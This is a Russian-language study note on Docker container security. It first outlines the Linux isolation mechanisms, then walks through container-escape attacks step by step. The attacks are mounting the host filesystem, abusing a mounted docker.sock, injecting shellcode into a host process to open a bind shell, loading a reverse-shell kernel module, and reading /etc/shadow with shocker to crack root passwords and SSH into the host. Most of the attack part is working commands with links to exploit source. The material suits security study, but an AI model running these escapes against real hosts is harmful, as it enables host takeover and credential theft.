Безопасность контейнеров

### Меры безопасность Linux
* Capabilities - полномочия ОС
```
https://man7.org/linux/man-pages/man7/capabilities.7.html
/proc/sys/kernel/cap_last_cap
$ capsh --print # проверить что сейчас в системе
```
* Linux namespace - абстракция над ресурсами ОС
```
ll /proc/$BASHPID/ns/ # отображает ссылки на пространства имён (namespaces) текущего или указанного процесса
lrwxrwxrwx 1 dev dev 0 Sep 18 12:15 uts -> 'uts:[4026532193]'
	4026532193 - это inode пространства имён. Если два процесса имеют одинаковый идентификатор для одного типа пространства, они находятся в одном изолированном окружении.
	cgroup → Управление ресурсами (cgroups).
	ipc → Изоляция межпроцессного взаимодействия (IPC).
	mnt → Изоляция файловой системы (точки монтирования).
	net → Сетевая изоляция (интерфейсы, порты, маршруты).
	pid → Изоляция дерева процессов (PID).
	pid_for_children → Будущие дочерние процессы унаследуют это пространство имён PID.
	user → Изоляция пользователей и групп.
	uts → Изоляция hostname и domainname.
```
* Cgroups - изоляция ресурсов хоста (CPU, RAM, ввод/вывод)
* AppArmor или SELinux - ограничения приложений LSM
* Seccomp - ограничения системных вызовов к ядру eBPF

Как выбраться из контейнера

### Отключить меры защиты при запуске контейнера
Любой флаг критичен
```
docker run -it \
	--privileged \ 
	--cap-add=ALL \
	--security-opt apparmor=unconfined \
	--security-opt seccomp=unconfined \
	--security-opt label:disable \
	--pid=host \
	--userns=host \
	--uts=host \
	--cgroupns=host \
```

### Монтирование хостовой системы в контейнер (нужно CAP_SYS_ADMIN, выключен AppArmor)
```
# Запускаем уязвимый контейнер
(host)$docker run -it --cap-drop=ALL --capadd=
SYS_ADMIN --security-opt apparmor=unconfined --device=/dev/:/
ubuntu bash

# Монтируем хостовую файловую систему
root@a99040cc6319:/# mount /vda2 /mnt
root@a99040cc6319:/# ls /mnt
bin dev home lib32 libx32 media opt root sbin srv tmp var
boot etc lib lib64 lost+found mnt proc run snap sys usr
```

### Использование примонтированного Docker Socket (/var/run/docker.sock)
```
# Запускаем уязвимый контейнер
(host)$ docker run -it -v /var/run/docker.sock:/run/docker.sock docker:dind /bin/sh

# Внутри контейнера запускаем новый привилегированный контейнер
~# docker run -it --privileged -v /:/host/ ubuntu bash -c "chroot /host/"

```

### Инъекция shell-code (нужно SYS_PTRACE и -pid=host)
```
# В контейнере должны быть тулзы
apt install vim # or any other editor
apt install gcc
apt install net-tools
apt install netcat

# Запускаем сервер HTTP для PoC и уязвимый контейнер
(host)$ /usr/bin/python3 -m http.server 8080
(host)$ docker run -it --pid=host --cap-add=SYS_PTRACE --security-opt apparmor=unconfined ubuntu bash

# Эксплуатация уязвимости
# List process that runs on the host and container.
ps -eaf | grep "/usr/bin/python3 -m http.server 8080" | head -n 1
# Copy and paste the payload from inject.c https://gitlab.com/devijoe/docker-attacks/-/blob/main/attack_3%20-%20ShellCode/inject.c
vim inject.c
gcc -o inject inject.c
# Inject the shellcode payload that will open a listener over port 5600
./inject <PID>
# Bind over port 5600
nc <HOST-IP> 5600
```

### Инъекция модуля ядра (нужно SYS_MODULE)
```
# Запускаем уязвимый контейнер
(host)$ docker run -it --cap-add=SYS_MODULE ubuntu:latest bash

# Атака
git clone https://gitlab.com/devijoe/docker-attacks/-/blob/main/attack_4%20-%20Kernel%20Module%20injection/reverse-shell.c
cd docker-attacks/attack_4 - Kernel Module injection
make
nc -lnvp 4444 & /usr/sbin/insmod reverse-shell.ko
```

### Чтение секретов с хоста (нужно DAC_READ_SEARCH)
```
# Запуск уязвимого контейнера
(host)$ sudo docker run -it --cap-add=DAC_READ_SEARCH ubuntu bash

# Чтение хэша пароля от рута из хоста
# Copy the shocker.c https://gitlab.com/devijoe/docker-attacks/-/blob/main/attack_5%20-%20Reading%20and%20Overriding%20host%20files/shocker.c?ref_type=heads
vim shocker.c
gcc -o shocker shocker.c
# Use the shocker to read files from host:./shocker /host/path /container/path
./shocker /etc/passwd passwd
./shocker /etc/shadow shadow
# Combine passwd and shadow files 
unshadow passwd shadow > password
# Use John the Ripper to crack passwords
john password
# Connect to the host with the John the ripper’s output credentials
ssh <USER-NAME>@<HOST-IP>
password: <password from john’s output>
```
